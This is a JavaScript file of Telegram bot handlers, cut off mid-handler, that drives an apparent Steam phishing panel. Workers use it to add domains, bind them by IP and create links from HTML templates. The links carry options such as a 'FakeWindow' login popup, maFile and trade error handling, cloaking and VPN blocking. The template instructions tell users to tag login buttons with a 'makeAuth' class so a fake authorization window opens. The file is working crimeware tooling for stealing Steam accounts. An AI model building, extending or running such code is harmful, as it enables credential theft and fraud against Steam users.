const { ensureUser, isTeamReferralPathTaken, getTeamReferralForDomain, getTeamReferralByLinkId, upsertTeamReferral, clearTeamReferralForDomain, clearTeamReferralByLinkId } = require("../services/userService");
const {
  authCredentials,
  getDomains,
  getAllDomainsForToken,
  checkDomainAvailability,
  getActualIPs,
  createDomain,
  deleteDomain,
  getSteamLinks,
  createSteamLink,
  updateSteamLink,
  deleteSteamLink,
  createTemplate,
  filterActiveSteamLinks,
  normalizeWindowType,
  getTeamWorkers,
  formatPanelError,
  isTimeoutError,
  isServiceUnavailable,
} = require("../services/apiService");
const { ensureWorkerPanelAccount } = require("../services/panelAccountService");
const { getVisibleTemplates, addVisibleTemplate } = require("../services/settingsService");
const { buildTemplatesFromToken, mergeEnabledTemplates } = require("../services/templateCatalogService");
const { generateTemplatePreview } = require("../services/templatePreviewService");
const { logger } = require("../utils/logger");
const axios = require("axios");
const {
  formatReferralLinkHtml,
  formatSitesHubHtml,
  formatDomainCardHtml,
  formatLinkParamsHtml,
  getLinkParamDefs,
  escapeHtml,
} = require("../utils/referral");
const { upsertBotMessage } = require("../utils/message");
const { pe, btn } = require("../utils/emoji");
const { clearPendingInputs, isBotCommandText } = require("../utils/session");
const {
  sitesKeyboard,
  sitesBindConfirmKeyboard,
  templatePublicKeyboard,
  domainLinksKeyboard,
  domainDeleteConfirmKeyboard,
  linkCreatorKeyboard,
  linkWindowTypeKeyboard,
  templatesKeyboard,
  referralLinkKeyboard,
  referralParamsKeyboard,
  referralWindowKeyboard,
  referralTemplatesKeyboard,
  referralCreateTemplatesKeyboard,
  referralCreateWindowKeyboard,
  referralDeleteConfirmKeyboard,
} = require("../keyboards/sites");

function filterAvailableDomains(rows = [], accountId) {
  return Array.isArray(rows)
    ? rows.filter(
        (domain) =>
          domain?.isTeamPublic === true ||
          domain?.isPublic === true ||
          Number(domain?.owner) === Number(accountId)
      )
    : [];
}

function filterOwnDomainsOnly(rows = [], accountId) {
  return Array.isArray(rows)
    ? rows.filter((domain) => Number(domain?.owner) === Number(accountId))
    : [];
}

function extractPanelOwnerId(data) {
  const value = [
    data?.id,
    data?.user?.id,
    data?.account?.id,
    data?.data?.id,
    data?.data?.user?.id,
  ].find((id) => Number.isFinite(Number(id)));
  return value == null ? null : Number(value);
}

function extractOwnerIdFromToken(token) {
  try {
    const payload = JSON.parse(Buffer.from(String(token).split(".")[1], "base64url").toString("utf8"));
    const id = Number(payload?.id);
    return Number.isFinite(id) ? id : null;
  } catch (_) {
    return null;
  }
}

function isInvalidCredentialsError(error) {
  const status = error?.response?.status;
  const code = String(error?.response?.data?.code || "");
  const message = String(error?.response?.data?.message || error?.message || "");
  return (
    status === 400 ||
    status === 401 ||
    /invalid_credentials|неверный логин|неверный пароль/i.test(`${code} ${message}`)
  );
}

function pickActualIp(ips) {
  if (Array.isArray(ips)) return ips[0] || "—";
  if (typeof ips === "string") return ips;
  return ips?.ip || ips?.[0] || "—";
}

async function showIpBindStep(ctx, flow, auth) {
  const ip = pickActualIp(await getActualIPs(auth.token));
  flow.step = "bind_confirm";
  flow.bindType = "IP";
  flow.bindIp = ip;
  flow.isPublic = false;
  flow.isTransit = false;
  await upsertBotMessage(
    ctx,
    [
      `${pe("location")} <b>Привязка по IP</b>`,
      "",
      `Домен: <code>${escapeHtml(flow.domain)}</code>`,
      `IP: <code>${escapeHtml(ip)}</code>`,
      "",
      `${pe("info")} Укажите A-запись домена на этот IP у регистратора.`,
      "Когда DNS готов — нажмите «Добавить домен».",
    ].join("\n"),
    { reply_markup: sitesBindConfirmKeyboard().reply_markup }
  );
}

/**
 * Авторизация в панели. НИКОГДА не пересоздаёт аккаунт при timeout/сбое сети —
 * только сообщает об ошибке. Иначе у админов плодятся лишние учётки.
 */
const panelSessionCache = new Map();
const PANEL_SESSION_TTL_MS = 8 * 60 * 1000;

async function getPanelToken(user) {
  if (isServiceUnavailable()) {
    throw new Error(formatPanelError({ response: { status: 503 } }));
  }

  const ready = await ensureWorkerPanelAccount(user);
  if (!ready.panelUsername || !ready.panelPassword) {
    throw new Error("Нет аккаунта сайтов. Создайте или привяжите его в админке.");
  }

  const cacheKey = String(ready.panelUsername).toLowerCase();
  const cached = panelSessionCache.get(cacheKey);
  if (
    cached &&
    cached.expiresAt > Date.now() &&
    cached.token &&
    Number.isFinite(cached.ownerId) &&
    cached.password === ready.panelPassword
  ) {
    return { token: cached.token, ownerId: cached.ownerId };
  }

  let auth;
  try {
    auth = await authCredentials(ready.panelUsername, ready.panelPassword);
  } catch (error) {
    if (isTimeoutError(error)) throw new Error(formatPanelError(error));
    if (isInvalidCredentialsError(error)) {
      throw new Error(
        "Неверный логин или пароль панели. Перепривяжите аккаунт сайтов в карточке участника."
      );
    }
    throw new Error(formatPanelError(error));
  }

  if (!auth.token) {
    throw new Error("Не удалось подключить сайты. Попробуйте позже.");
  }

  let ownerId = extractOwnerIdFromToken(auth.token);
  if (!Number.isFinite(ownerId)) {
    try {
      const workers = await getTeamWorkers(auth.token);
      ownerId = Number(
        workers?.rows?.find(
          (row) => String(row.username).toLowerCase() === String(ready.panelUsername).toLowerCase()
        )?.id
      );
    } catch (_) { /* fallback below */ }
  }
  ownerId = Number.isFinite(ownerId) ? ownerId : extractPanelOwnerId(auth.data);
  if (!Number.isFinite(ownerId)) {
    throw new Error("Не удалось определить ID аккаунта панели.");
  }

  panelSessionCache.set(cacheKey, {
    token: auth.token,
    ownerId,
    password: ready.panelPassword,
    expiresAt: Date.now() + PANEL_SESSION_TTL_MS,
  });
  return { token: auth.token, ownerId };
}

function linkPayload(domain, state) {
  return {
    path: state.path || "",
    windowType: state.windowType || "FakeWindow",
    domain,
    template: state.templateId,
    cloaking: false,
    ban_vpn: false,
    iframe: true,
    logError: true,
    mafileError: false,
    mafileSteamRedirect: true,
    tradeError: true,
    randPath: !state.path,
  };
}

const STEAM_PARAM_KEYS = new Set([
  "logError",
  "tradeError",
  "mafileError",
  "mafileSteamRedirect",
  "logRedirect",
  "tradeRedirect",
  "mafileRedirect",
]);
const PANEL_AUTH_TTL_MS = 10 * 60 * 1000;

async function loadDomainById(token, ownerId, domainId) {
  const domains = filterAvailableDomains(await getAllDomainsForToken(token), ownerId);
  const domain = domains.find((row) => Number(row.id) === Number(domainId));
  if (!domain) throw new Error("Домен недоступен.");
  return domain;
}

/** Ссылка воркера на домене в панели (по id или path). */
async function findWorkerPanelLink(token, domainId, existing) {
  if (!existing) return null;
  const links = (await getSteamLinks(token, domainId, 0, 100)).rows || [];
  return (
    links.find(
      (link) =>
        (existing.panelLinkId != null && Number(link.id) === Number(existing.panelLinkId)) ||
        String(link.path || "").replace(/^\/+/, "") === String(existing.path || "").replace(/^\/+/, "")
    ) || null
  );
}

async function createTeamReferralLink(auth, user, domainId, { path, templateId, windowType } = {}) {
  const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
  const normalizedPath = String(path || "")
    .trim()
    .replace(/^\/+/, "")
    .replace(/\/+$/, "");
  if (!normalizedPath) throw new Error("Укажите адрес страницы.");
  if (!Number.isFinite(Number(templateId)) || Number(templateId) < 1) {
    throw new Error("Выберите шаблон.");
  }

  if (await isTeamReferralPathTaken(domainId, normalizedPath)) {
    throw new Error("Такой адрес уже занят. Укажите другой.");
  }

  const ownLinks = filterActiveSteamLinks((await getSteamLinks(auth.token, domainId, 0, 100)).rows || []);
  if (
    ownLinks.some(
      (link) => String(link.path || "").replace(/^\/+/, "") === normalizedPath
    )
  ) {
    throw new Error("Такой адрес уже занят. Укажите другой.");
  }

  try {
    const created = await createSteamLink(auth.token, {
      ...linkPayload(domainId, {
        path: normalizedPath,
        windowType: normalizeWindowType(windowType || "FakeWindow"),
        templateId: Number(templateId),
      }),
      randPath: false,
    });
    const saved = {
      domainId: Number(domainId),
      path: String(created?.path || normalizedPath).replace(/^\/+/, ""),
      panelLinkId: created?.id,
    };
    await upsertTeamReferral(user.telegramId, saved);
    return {
      domainId: Number(domainId),
      existing: saved,
      domain,
      row: created || saved,
      ownDomain: Number(domain.owner) === auth.ownerId,
    };
  } catch (error) {
    const msg = String(error?.response?.data?.message || error.message || "");
    if (/exist|taken|duplicate|unique|conflict|занят/i.test(msg)) {
      throw new Error("Такой адрес уже занят. Укажите другой.");
    }
    throw error;
  }
}

function getReferralCache(ctx, domainId) {
  const cache = ctx.session?.referralCache;
  if (!cache || Number(cache.domainId) !== Number(domainId)) return null;
  return cache;
}

function setReferralCache(ctx, payload) {
  if (!ctx.session) return payload;
  ctx.session.referralCache = {
    domainId: Number(payload.domainId),
    existing: payload.existing,
    domain: payload.domain,
    row: payload.row,
    ownDomain: Boolean(payload.ownDomain),
  };
  return ctx.session.referralCache;
}

function clearReferralCache(ctx) {
  if (ctx.session) ctx.session.referralCache = null;
}

function rememberPanelAuth(ctx, auth) {
  if (!ctx.session || !auth?.token) return auth;
  ctx.session.panelAuth = { token: auth.token, ownerId: auth.ownerId, at: Date.now() };
  return auth;
}

async function resolvePanelAuth(ctx, user) {
  const cached = ctx.session?.panelAuth;
  if (cached?.token && Date.now() - Number(cached.at || 0) < PANEL_AUTH_TTL_MS) {
    return { token: cached.token, ownerId: cached.ownerId };
  }
  return rememberPanelAuth(ctx, await getPanelToken(user));
}

function applyLinkPatchToRow(row, patch = {}) {
  const next = { ...(row || {}) };
  const steamPatch = {};
  for (const [key, value] of Object.entries(patch)) {
    if (STEAM_PARAM_KEYS.has(key)) steamPatch[key] = value;
    else next[key] = value;
  }
  if (Object.keys(steamPatch).length) {
    next.steam = { ...(next.steam || {}), ...steamPatch };
  }
  return next;
}

/** Панель требует windowType в любом PATCH ссылки. */
function linkUpdatePayload(cache, patch = {}) {
  return {
    ...patch,
    windowType: normalizeWindowType(patch.windowType ?? cache?.row?.windowType),
  };
}

async function loadLinkCard(auth, user, domainId, linkId) {
  const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
  const links = filterActiveSteamLinks(
    ((await getSteamLinks(auth.token, domainId, 0, 100)).rows || []).filter(
      (link) => Number(link.owner) === auth.ownerId
    )
  );
  const row = links.find((link) => Number(link.id) === Number(linkId));
  if (!row) throw new Error("Ссылка не найдена или недоступна.");

  const path = String(row.path || "").replace(/^\/+/, "");
  let existing =
    (await getTeamReferralByLinkId(user.telegramId, row.id)) ||
    (await getTeamReferralForDomain(user.telegramId, domainId));
  if (!existing || Number(existing.panelLinkId) !== Number(row.id)) {
    existing = { domainId: Number(domainId), path, panelLinkId: Number(row.id) };
    // Sync Mongo for team domains so stats/monitor keep working.
    if (Number(domain.owner) !== auth.ownerId) {
      await upsertTeamReferral(user.telegramId, existing);
    }
  } else if (String(existing.path || "") !== path) {
    existing = { ...existing, path };
    await upsertTeamReferral(user.telegramId, existing);
  }

  return {
    domainId: Number(domainId),
    existing,
    domain,
    row,
    ownDomain: Number(domain.owner) === auth.ownerId,
  };
}

async function loadReferralRow(auth, user, domainId, { linkId = null } = {}) {
  if (linkId != null) return loadLinkCard(auth, user, domainId, linkId);

  const existing = await getTeamReferralForDomain(user.telegramId, domainId);
  if (!existing) throw new Error("Реферальная ссылка ещё не создана.");

  if (existing?.panelLinkId) {
    try {
      return await loadLinkCard(auth, user, domainId, existing.panelLinkId);
    } catch (_) {
      // fall through to path match
    }
  }

  const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
  const links = (await getSteamLinks(auth.token, domainId, 0, 50)).rows || [];
  const row =
    links.find(
      (link) =>
        Number(link.id) === Number(existing.panelLinkId) ||
        String(link.path) === String(existing.path)
    ) || existing;
  return {
    domainId: Number(domainId),
    existing,
    domain,
    row,
    ownDomain: Number(domain.owner) === auth.ownerId,
  };
}

async function getReferralView(ctx, user, domainId, auth, { force = false, linkId = null } = {}) {
  if (!force && !linkId) {
    const cached = getReferralCache(ctx, domainId);
    if (cached) return cached;
  }
  if (linkId != null) {
    return setReferralCache(ctx, await loadLinkCard(auth, user, domainId, linkId));
  }
  const cached = getReferralCache(ctx, domainId);
  const fromCacheId = cached?.existing?.panelLinkId || cached?.row?.id;
  if (fromCacheId) {
    return setReferralCache(ctx, await loadLinkCard(auth, user, domainId, fromCacheId));
  }
  const loaded = await loadReferralRow(auth, user, domainId);
  return setReferralCache(ctx, loaded);
}

function normalizeRefPathInput(raw) {
  return String(raw || "")
    .trim()
    .replace(/^https?:\/\//i, "")
    .replace(/^[^/]+\//, "") // drop domain if pasted full URL
    .replace(/^\/+/, "")
    .replace(/\/+$/, "")
    .replace(/\s+/g, "");
}

async function loadPickerTemplates(ctx) {
  try {
    const user = await ensureUser(ctx.from);
    const auth = await getPanelToken(user);
    const { templates } = await buildTemplatesFromToken(auth.token, { syncVisibility: false });
    const visible = await getVisibleTemplates();
    const merged = mergeEnabledTemplates(templates, visible, user.telegramId);
    if (merged.length) return merged;
  } catch {
    // fallback below
  }
  const visible = await getVisibleTemplates();
  return mergeEnabledTemplates([], visible, ctx.from?.id);
}

async function findPickerTemplate(ctx, templateId) {
  const id = Number(templateId);
  const fromSession = (ctx.session?.linkTemplates || []).find((row) => Number(row.id) === id);
  if (fromSession) return fromSession;
  const templates = await loadPickerTemplates(ctx);
  if (ctx.session) ctx.session.linkTemplates = templates;
  return (
    templates.find((row) => Number(row.id) === id) || {
      id,
      name: `Template #${id}`,
    }
  );
}

async function askRefCreateTemplateStep(ctx, domainId) {
  const templates = await loadPickerTemplates(ctx);
  if (ctx.session) ctx.session.linkTemplates = templates;
  const flow = ctx.session?.refCreate;
  const domainName = flow?.domainName || "";
  await upsertBotMessage(
    ctx,
    [
      `${pe("gift")} <b>Реферальная ссылка</b> · шаг 2/3`,
      "",
      domainName
        ? `Адрес: <code>${escapeHtml(domainName)}/${escapeHtml(flow.path)}</code>`
        : `Адрес: <code>/${escapeHtml(flow?.path || "")}</code>`,
      "",
      "Выберите шаблон или создайте свой.",
    ].join("\n"),
    { reply_markup: referralCreateTemplatesKeyboard(domainId, templates).reply_markup }
  );
}

async function askRefCreateWindowStep(ctx, domainId) {
  const flow = ctx.session?.refCreate;
  await upsertBotMessage(
    ctx,
    [
      `${pe("gift")} <b>Реферальная ссылка</b> · шаг 3/3`,
      "",
      `Шаблон: <b>${escapeHtml(flow?.templateName || `#${flow?.templateId || ""}`)}</b>`,
      "",
      "Выберите окно авторизации.",
    ].join("\n"),
    { reply_markup: referralCreateWindowKeyboard(domainId).reply_markup }
  );
}

async function renderReferralCard(ctx, cache) {
  await upsertBotMessage(
    ctx,
    formatReferralLinkHtml(cache.domain.domain, cache.existing.path, cache.row, cache.domain, {
      ownDomain: cache.ownDomain,
    }),
    { reply_markup: referralLinkKeyboard(cache.domainId).reply_markup }
  );
}

async function renderReferralParams(ctx, cache) {
  await upsertBotMessage(ctx, formatLinkParamsHtml(cache.row), {
    reply_markup: referralParamsKeyboard(cache.domainId, cache.row).reply_markup,
  });
}

async function showReferral(ctx, user, domainId, auth, { force = false } = {}) {
  const cache = await getReferralView(ctx, user, domainId, auth, { force });
  await renderReferralCard(ctx, cache);
  return cache;
}

async function showReferralParams(ctx, user, domainId, auth, { force = false } = {}) {
  const cache = await getReferralView(ctx, user, domainId, auth, { force });
  await renderReferralParams(ctx, cache);
  return cache;
}

async function showSitesHub(ctx, user) {
  const auth = rememberPanelAuth(ctx, await getPanelToken(user));
  clearReferralCache(ctx);
  const domains = filterAvailableDomains(await getAllDomainsForToken(auth.token), auth.ownerId);
  ctx.session.sites = { domains, ownerId: auth.ownerId };
  await upsertBotMessage(ctx, formatSitesHubHtml(domains, auth.ownerId), {
    reply_markup: sitesKeyboard(domains, auth.ownerId).reply_markup,
  });
  return auth;
}

function templateMakeAuthHintHtml() {
  return [
    `${pe("info")} <b>Внимание!</b>`,
    "Для открытия окна авторизации на нужных элементах добавьте класс <code>makeAuth</code>:",
    "",
    "<code>&lt;a&gt;Войти&lt;/a&gt;</code>",
    "изменить на",
    "<code>&lt;a class=\"makeAuth\"&gt;Войти&lt;/a&gt;</code>",
    "",
    "<code>&lt;div class=\"btn\"&gt;Войти&lt;/div&gt;</code>",
    "изменить на",
    "<code>&lt;div class=\"btn makeAuth\"&gt;Войти&lt;/div&gt;</code>",
  ].join("\n");
}

function normalizeTemplateHtml(raw) {
  let code = String(raw || "").trim();
  if (!code) return "";
  // Strip common fenced code blocks from Telegram clients.
  const fenced = code.match(/^```(?:html|HTML)?\s*\n?([\s\S]*?)\n?```$/);
  if (fenced) code = fenced[1].trim();
  return code;
}

async function askTemplateCodeStep(ctx) {
  await upsertBotMessage(
    ctx,
    [
      `${pe("code")} <b>Добавление шаблона</b> · шаг 3/3`,
      "",
      "Пришлите HTML-код шаблона сообщением или файлом <code>.html</code>.",
      "",
      templateMakeAuthHintHtml(),
    ].join("\n"),
    {
      reply_markup: {
        inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
      },
    }
  );
}

async function finishTemplateCreate(ctx, user, code) {
  const flow = ctx.session?.templateFlow;
  if (!flow?.name) throw new Error("Сессия создания шаблона устарела");
  const html = normalizeTemplateHtml(code);
  if (!html) throw new Error("HTML-код пустой");

  const auth = await resolvePanelAuth(ctx, user);
  await upsertBotMessage(ctx, `${pe("loading")} Создаю шаблон…`);
  const created = await createTemplate(auth.token, {
    name: flow.name,
    isPublic: Boolean(flow.isPublic),
    code: html,
    service: "Steam",
  });
  const id = created?.id || created?.data?.id;
  const name = created?.name || flow.name;
  if (id != null) {
    try {
      await addVisibleTemplate({
        id,
        name,
        ownerTelegramId: String(user?.telegramId || ctx.from?.id || ""),
        isPublic: Boolean(flow.isPublic),
      });
    } catch (_) {
      // visibility list is best-effort; template already exists on Uproject
    }
  }
  if (id != null) {
    const remotePreview = created?.preview || created?.data?.preview || "";
    void generateTemplatePreview(id, { html, remoteUrl: remotePreview }).catch((error) => {
      logger.warn("Custom template preview generation failed", {
        templateId: id,
        error: error.message,
      });
    });
  }
  ctx.session.templateFlow = null;
  if (flow.returnTo === "refCreate" && ctx.session?.refCreate?.domainId) {
    const domainId = Number(ctx.session.refCreate.domainId);
    if (id != null) {
      ctx.session.refCreate.templateId = Number(id);
      ctx.session.refCreate.templateName = name;
      ctx.session.refCreate.step = "window";
      await askRefCreateWindowStep(ctx, domainId);
      return;
    }
    ctx.session.refCreate.step = "template";
    await askRefCreateTemplateStep(ctx, domainId);
    return;
  }

  await upsertBotMessage(
    ctx,
    [
      `${pe("success")} <b>Шаблон создан</b>`,
      "",
      `Название: <b>${escapeHtml(name)}</b>`,
      id != null ? `ID: <code>${id}</code>` : null,
      `Доступ: ${flow.isPublic ? "общедоступный для команды" : "только вы"}`,
      "",
      flow.isPublic
        ? `${pe("info")} Шаблон добавлен в список доступных для создания ссылок.`
        : `${pe("info")} Шаблон виден только тебе.`,
    ]
      .filter((line) => line != null)
      .join("\n"),
    {
      reply_markup: {
        inline_keyboard: [[btn("К сайтам", "menu:sites", "home")]],
      },
    }
  );
}

function registerSitesHandlers(bot) {
  // UI «Сайты» в боте скрыт — управление в веб-панели. Handlers ниже сохранены.
  const SITES_BOT_UI_HIDDEN = true;

  bot.action("menu:sites", async (ctx) => {
    clearPendingInputs(ctx);
    await ctx.answerCbQuery();
    if (SITES_BOT_UI_HIDDEN) {
      const { sitesMovedToPanelKeyboard } = require("../keyboards/common");
      await upsertBotMessage(
        ctx,
        [
          `${pe("link")} <b>Сайты</b>`,
          "",
          "Управление доменами и ссылками перенесено в веб-панель.",
          "Открой Mini App кнопкой ниже.",
        ].join("\n"),
        { reply_markup: sitesMovedToPanelKeyboard().reply_markup }
      );
      return;
    }
    try {
      const user = await ensureUser(ctx.from);
      await showSitesHub(ctx, user);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: { inline_keyboard: [[btn("Назад", "menu:home", "home")]] },
      });
    }
  });

  bot.action(/^sites:domain:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    if (ctx.session) {
      ctx.session.linkCreate = null;
      ctx.session.linkCreateStep = null;
      ctx.session.linkTemplates = null;
      ctx.session.sitesFlow = null;
      ctx.session.templateFlow = null;
      ctx.session.refCreate = null;
      clearReferralCache(ctx);
    }
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
      const own = Number(domain.owner) === auth.ownerId;
      // Как в панели: на командном домене видны только свои ссылки.
      const links = filterActiveSteamLinks(
        ((await getSteamLinks(auth.token, domainId, 0, 50)).rows || []).filter(
          (link) => Number(link.owner) === auth.ownerId
        )
      );
      ctx.session.sites = {
        ...(ctx.session.sites || {}),
        activeDomainId: domainId,
        activeDomainName: domain.domain,
        ownerId: auth.ownerId,
      };
      await upsertBotMessage(ctx, formatDomainCardHtml(domain, { own, linksCount: links.length }), {
        reply_markup: domainLinksKeyboard(domainId, links, { team: !own }).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:domain:delete:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
      if (Number(domain.owner) !== Number(auth.ownerId)) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Удалить можно только свой домен.`,
          { reply_markup: { inline_keyboard: [[btn("К сайтам", "menu:sites", "home")]] } }
        );
        return;
      }
      await upsertBotMessage(
        ctx,
        [
          `${pe("delete")} <b>Удалить домен?</b>`,
          "",
          `Домен: <code>${escapeHtml(domain.domain)}</code>`,
          "",
          "Все ссылки на этом домене станут недоступны. Действие необратимо.",
        ].join("\n"),
        { reply_markup: domainDeleteConfirmKeyboard(domainId).reply_markup }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:domain:delete:ok:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery("Удаляю…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
      if (Number(domain.owner) !== Number(auth.ownerId)) {
        throw new Error("Удалить можно только свой домен.");
      }
      await deleteDomain(auth.token, domainId);
      await clearTeamReferralForDomain(user.telegramId, domainId);
      clearReferralCache(ctx);
      await upsertBotMessage(
        ctx,
        [
          `${pe("success")} <b>Домен удалён</b>`,
          "",
          `Был удалён: <code>${escapeHtml(domain.domain)}</code>`,
        ].join("\n"),
        {
          reply_markup: {
            inline_keyboard: [[btn("К сайтам", "menu:sites", "home")]],
          },
        }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: {
          inline_keyboard: [
            [btn("К домену", `sites:domain:${domainId}`, "link")],
            [btn("К сайтам", "menu:sites", "home")],
          ],
        },
      });
    }
  });

  bot.action("sites:add", async (ctx) => {
    clearPendingInputs(ctx);
    ctx.session.sitesFlow = { step: "domain_input" };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        `${pe("edit")} <b>Добавление домена</b>`,
        "",
        "Введите домен, например <code>example.com</code>.",
        "",
        `${pe("info")} Дальше покажем IP для A-записи и подтверждение.`,
      ].join("\n"),
      {
        reply_markup: {
          inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
        },
      }
    );
  });

  bot.action("sites:template:add", async (ctx) => {
    clearPendingInputs(ctx);
    ctx.session.templateFlow = { step: "name" };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        `${pe("code")} <b>Добавление шаблона</b> · шаг 1/3`,
        "",
        "Укажите название шаблона.",
      ].join("\n"),
      {
        reply_markup: {
          inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
        },
      }
    );
  });

  bot.action(/^sites:template:public:([01])$/, async (ctx) => {
    const flow = ctx.session?.templateFlow;
    if (!flow?.name || flow.step !== "public") {
      return ctx.answerCbQuery("Сессия устарела", { show_alert: true });
    }
    flow.isPublic = ctx.match[1] === "1";
    flow.step = "code";
    await ctx.answerCbQuery(flow.isPublic ? "Публичный" : "Приватный");
    await askTemplateCodeStep(ctx);
  });

  bot.action("sites:cancel", async (ctx) => {
    await ctx.answerCbQuery("Операция отменена");
    clearPendingInputs(ctx);
    try {
      const user = await ensureUser(ctx.from);
      await showSitesHub(ctx, user);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: { inline_keyboard: [[btn("В меню", "menu:home", "home")]] },
      });
    }
  });

  bot.action("sites:bind:confirm:IP", async (ctx) => {
    const flow = ctx.session?.sitesFlow;
    if (!flow?.domain) return ctx.answerCbQuery("Сессия истекла", { show_alert: true });
    await ctx.answerCbQuery("Добавляю домен…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const created = await createDomain(auth.token, {
        domain: flow.domain,
        type: "IP",
        service: "Steam",
        isPublic: false,
        isTransit: false,
      });
      const domainId = created?.id || created?.data?.id;
      ctx.session.sitesFlow = null;
      await upsertBotMessage(
        ctx,
        [
          `${pe("success")} <b>Домен добавлен</b>`,
          "",
          `Домен: <code>${escapeHtml(created?.domain || flow.domain)}</code>`,
          domainId != null ? `ID: <code>${domainId}</code>` : null,
          created?.ip ? `IP: <code>${escapeHtml(created.ip)}</code>` : null,
          "",
          `${pe("info")} Дождитесь обновления DNS, затем создайте ссылки.`,
        ]
          .filter((line) => line != null)
          .join("\n"),
        {
          reply_markup: {
            inline_keyboard: [
              domainId
                ? [btn("Открыть домен", `sites:domain:${domainId}`, "link")]
                : [btn("К сайтам", "menu:sites", "home")],
              [btn("К сайтам", "menu:sites", "home")],
            ],
          },
        }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: sitesBindConfirmKeyboard().reply_markup,
      });
    }
  });

  bot.action(/^sites:link_create:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      // Личный или командный публичный — как «Создать ссылку» в панели.
      await loadDomainById(auth.token, auth.ownerId, domainId);
      ctx.session.linkCreate = {
        domainId,
        domainName: ctx.session?.sites?.activeDomainName || "",
        path: "",
        windowType: "FakeWindow",
        templateId: null,
        templateName: "",
      };
      await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
        reply_markup: linkCreatorKeyboard(domainId, ctx.session.linkCreate).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action("sites:link:path", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    ctx.session.linkCreateStep = "path_input";
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("edit")} Введите path или <code>-</code>, чтобы оставить пустым.`, {
      reply_markup: { inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]] },
    });
  });

  bot.action("sites:link:template", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    await ctx.answerCbQuery();
    try {
      ctx.session.linkTemplates = await loadPickerTemplates(ctx);
      const emptyHint = ctx.session.linkTemplates.length
        ? "Выберите шаблон или найдите по ID."
        : "Нет доступных шаблонов. Можно искать по ID.";
      await upsertBotMessage(ctx, `${pe("file")} ${emptyHint}`, {
        reply_markup: templatesKeyboard(ctx.session.linkTemplates).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action("sites:link:template:search", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    ctx.session.linkCreateStep = "template_id_input";
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("edit")} Введите <b>ID шаблона</b> (только цифры).`, {
      reply_markup: { inline_keyboard: [[btn("Отменить", "sites:link:template", "error")]] },
    });
  });

  bot.action(/^sites:template:(\d+)$/, async (ctx) => {
    const templateId = Number(ctx.match[1]);
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    const template =
      ctx.session?.linkTemplates?.find((row) => Number(row.id) === templateId) ||
      (await loadPickerTemplates(ctx)).find((row) => Number(row.id) === templateId);
    if (!template) return ctx.answerCbQuery("Шаблон не найден", { show_alert: true });
    Object.assign(ctx.session.linkCreate, { templateId: template.id, templateName: template.name });
    await ctx.answerCbQuery("Шаблон выбран");
    await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
      reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
    });
  });

  bot.action("sites:link:window", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("settings")} Выберите окно авторизации.`, {
      reply_markup: linkWindowTypeKeyboard().reply_markup,
    });
  });

  bot.action(/^sites:window:(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    ctx.session.linkCreate.windowType = ctx.match[1];
    await ctx.answerCbQuery("Окно обновлено");
    await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
